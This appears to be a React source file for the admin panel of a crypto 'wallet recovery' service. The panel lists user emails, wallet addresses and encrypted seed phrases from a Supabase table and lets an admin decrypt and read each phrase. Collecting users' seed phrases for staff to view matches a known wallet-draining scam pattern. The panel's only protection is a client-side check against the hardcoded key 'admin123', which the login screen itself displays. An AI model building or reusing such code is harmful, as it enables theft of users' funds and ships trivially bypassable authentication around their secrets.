import React, { useState, useEffect } from 'react'
import { supabase } from '../lib/supabase'
import { decryptSeedPhrase } from '../utils/encryption'
import type { WalletRecovery } from '../types/wallet'
import { Eye, EyeOff, RefreshCw, CheckCircle, XCircle, Clock } from 'lucide-react'

export const AdminDashboard: React.FC = () => {
  const [recoveries, setRecoveries] = useState<WalletRecovery[]>([])
  const [isLoading, setIsLoading] = useState(true)
  const [visibleSeeds, setVisibleSeeds] = useState<Set<string>>(new Set())
  const [isAuthenticated, setIsAuthenticated] = useState(false)
  const [adminKey, setAdminKey] = useState('')

  const loadRecoveries = async () => {
    setIsLoading(true)
    try {
      const { data, error } = await supabase
        .from('wallet_recoveries')
        .select('*')
        .order('created_at', { ascending: false })

      if (error) throw error
      setRecoveries(data || [])
    } catch (error) {
      console.error('Error loading recoveries:', error)
    } finally {
      setIsLoading(false)
    }
  }

  const handleAuthentication = () => {
    // Simple admin authentication - in production, use proper auth
    if (adminKey === 'admin123') {
      setIsAuthenticated(true)
      loadRecoveries()
    } else {
      alert('Invalid admin key')
    }
  }

  const toggleSeedVisibility = (id: string) => {
    const newVisible = new Set(visibleSeeds)
    if (newVisible.has(id)) {
      newVisible.delete(id)
    } else {
      newVisible.add(id)
    }
    setVisibleSeeds(newVisible)
  }

  const updateStatus = async (id: string, status: string) => {
    try {
      const { error } = await supabase
        .from('wallet_recoveries')
        .update({ status, updated_at: new Date().toISOString() })
        .eq('id', id)

      if (error) throw error
      loadRecoveries()
    } catch (error) {
      console.error('Error updating status:', error)
    }
  }

  const getStatusIcon = (status: string) => {
    switch (status) {
      case 'completed':
        return <CheckCircle className="w-4 h-4 text-green-500" />
      case 'rejected':
        return <XCircle className="w-4 h-4 text-red-500" />
      default:
        return <Clock className="w-4 h-4 text-yellow-500" />
    }
  }

  const getStatusColor = (status: string) => {
    switch (status) {
      case 'completed':
        return 'text-green-400 bg-green-900/20'
      case 'rejected':
        return 'text-red-400 bg-red-900/20'
      default:
        return 'text-yellow-400 bg-yellow-900/20'
    }
  }

  if (!isAuthenticated) {
    return (
      <div className="max-w-md mx-auto bg-gray-800 rounded-lg p-6">
        <h2 className="text-2xl font-bold text-white mb-4">Admin Access</h2>
        <div className="space-y-4">
          <input
            type="password"
            value={adminKey}
            onChange={(e) => setAdminKey(e.target.value)}
            placeholder="Enter admin key"
            className="w-full px-3 py-2 bg-gray-700 border border-gray-600 rounded-lg text-white focus:outline-none focus:ring-2 focus:ring-blue-500"
            onKeyPress={(e) => e.key === 'Enter' && handleAuthentication()}
          />
          <button
            onClick={handleAuthentication}
            className="w-full bg-blue-600 text-white px-4 py-2 rounded-lg hover:bg-blue-700 transition-colors"
          >
            Login
          </button>
          <p className="text-gray-400 text-sm text-center">
            Demo admin key: admin123
          </p>
        </div>
      </div>
    )
  }

  return (
    <div className="space-y-6">
      <div className="flex items-center justify-between">
        <h2 className="text-2xl font-bold text-white">Admin Dashboard</h2>
        <button
          onClick={loadRecoveries}
          disabled={isLoading}
          className="bg-blue-600 text-white px-4 py-2 rounded-lg hover:bg-blue-700 disabled:opacity-50 transition-colors flex items-center space-x-2"
        >
          <RefreshCw className={`w-4 h-4 ${isLoading ? 'animate-spin' : ''}`} />
          <span>Refresh</span>
        </button>
      </div>

      {isLoading ? (
        <div className="bg-gray-800 rounded-lg p-6 animate-pulse">
          <div className="space-y-4">
            {[...Array(3)].map((_, i) => (
              <div key={i} className="h-16 bg-gray-700 rounded"></div>
            ))}
          </div>
        </div>
      ) : (
        <div className="space-y-4">
          {recoveries.length === 0 ? (
            <div className="bg-gray-800 rounded-lg p-6 text-center text-gray-400">
              No recovery requests found
            </div>
          ) : (
            recoveries.map((recovery) => (
              <div key={recovery.id} className="bg-gray-800 rounded-lg p-6">
                <div className="flex items-center justify-between mb-4">
                  <div className="flex items-center space-x-3">
                    {getStatusIcon(recovery.status)}
                    <span className={`px-2 py-1 rounded text-xs font-medium ${getStatusColor(recovery.status)}`}>
                      {recovery.status.toUpperCase()}
                    </span>
                  </div>
                  <span className="text-gray-400 text-sm">
                    {new Date(recovery.created_at).toLocaleString()}
                  </span>
                </div>

                <div className="grid grid-cols-1 md:grid-cols-2 gap-4 mb-4">
                  <div>
                    <p className="text-gray-400 text-sm">Email</p>
                    <p className="text-white">{recovery.user_email}</p>
                  </div>
                  <div>
                    <p className="text-gray-400 text-sm">Recovery Type</p>
                    <p className="text-white capitalize">{recovery.recovery_type}</p>
                  </div>
                  <div>
                    <p className="text-gray-400 text-sm">Wallet Address</p>
                    <p className="text-white font-mono text-sm">{recovery.wallet_address}</p>
                  </div>
                  <div>
                    <p className="text-gray-400 text-sm">Seed Phrase</p>
                    <div className="flex items-center space-x-2">
                      {visibleSeeds.has(recovery.id) ? (
                        <p className="text-white text-sm break-all">
                          {decryptSeedPhrase(recovery.encrypted_seed)}
                        </p>
                      ) : (
                        <p className="text-gray-500 text-sm">•••••••••••••••••••••••••</p>
                      )}
                      <button
                        onClick={() => toggleSeedVisibility(recovery.id)}
                        className="text-gray-400 hover:text-white"
                      >
                        {visibleSeeds.has(recovery.id) ? (
                          <EyeOff className="w-4 h-4" />
                        ) : (
                          <Eye className="w-4 h-4" />
                        )}
                      </button>
                    </div>
                  </div>
                </div>

                <div className="flex space-x-2">
                  <button
                    onClick={() => updateStatus(recovery.id, 'completed')}
                    disabled={recovery.status === 'completed'}
                    className="bg-green-600 text-white px-3 py-1 rounded text-sm hover:bg-green-700 disabled:opacity-50 disabled:cursor-not-allowed transition-colors"
                  >
                    Approve
                  </button>
                  <button
                    onClick={() => updateStatus(recovery.id, 'rejected')}
                    disabled={recovery.status === 'rejected'}
                    className="bg-red-600 text-white px-3 py-1 rounded text-sm hover:bg-red-700 disabled:opacity-50 disabled:cursor-not-allowed transition-colors"
                  >
                    Reject
                  </button>
                  <button
                    onClick={() => updateStatus(recovery.id, 'pending')}
                    disabled={recovery.status === 'pending'}
                    className="bg-yellow-600 text-white px-3 py-1 rounded text-sm hover:bg-yellow-700 disabled:opacity-50 disabled:cursor-not-allowed transition-colors"
                  >
                    Reset to Pending
                  </button>
                </div>
              </div>
            ))
          )}
        </div>
      )}
    </div>
  )
}